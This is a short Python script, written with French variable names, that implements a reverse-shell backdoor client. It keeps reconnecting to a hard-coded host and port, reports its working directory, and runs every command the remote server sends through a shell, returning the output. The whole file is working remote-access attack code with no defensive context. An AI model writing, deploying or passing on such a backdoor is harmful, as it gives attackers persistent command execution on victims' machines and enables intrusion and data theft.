import socket, os, subprocess, time

hote = "127.0.0.1"
port = 25565
clearconsole = "cls"
nothing = " ".encode()

def connect():
    connection = True
    while connection is True:
        try:
            connectionToServer.connect((hote, port))
            connection = False
        except ConnectionRefusedError:
            time.sleep(3)

    Clientboucle = True

    while Clientboucle is True:
        jesuisou = os.getcwd().encode()
        try:
            connectionToServer.send(jesuisou)
        except OSError:
            connectionToServer.close()
            break
        try:
            commande = connectionToServer.recv(50).decode()
            if commande != "closeserverclient":
                stderr = b''
                stdout = b''
                if 'cd' in commande:
                    derniereLettre = commande[-1]
                    directory = commande[3:-1]+derniereLettre
                    try:
                        os.chdir(directory)
                    except FileNotFoundError:
                        stdout = b"Le dossier/fichier n'existe pas"
                else:
                    commande = commande.encode()
                    spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = spl.communicate()
                if stdout == b'':
                    connectionToServer.send(stderr)
                if stderr == b'':
                    connectionToServer.send(stdout)
                if stdout == b'' and stderr == b'':
                    connectionToServer.send(nothing)
            elif clearconsole == commande:
                connectionToServer.send(nothing)
            elif "" == commande:
                connectionToServer.send(nothing)
            else:
                Clientboucle = False
        except ConnectionResetError:
            connectionToServer.close()

while True:
    connectionToServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()